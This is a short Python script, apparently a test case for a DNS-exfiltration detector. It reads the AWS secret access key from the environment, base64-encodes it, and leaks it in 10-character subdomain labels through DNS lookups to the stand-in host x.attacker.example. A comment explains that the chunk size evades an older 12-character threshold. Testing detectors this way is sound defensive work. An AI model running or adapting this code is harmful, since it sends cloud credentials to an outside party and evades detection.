import os, base64, socket
s = os.environ["AWS_SECRET_ACCESS_KEY"].encode()
enc = base64.urlsafe_b64encode(s).decode().rstrip("=")
# 10-char labels, below the old 12-char chunk threshold. The runner reassembles
# the subdomain labels across lookups, so the split secret is detected.
for i in range(0, len(enc), 10):
    lab = enc[i:i + 10]
    try:
        socket.gethostbyname(lab + ".x.attacker.example")
    except Exception:
        pass
print("dns split-label exfil attempted")
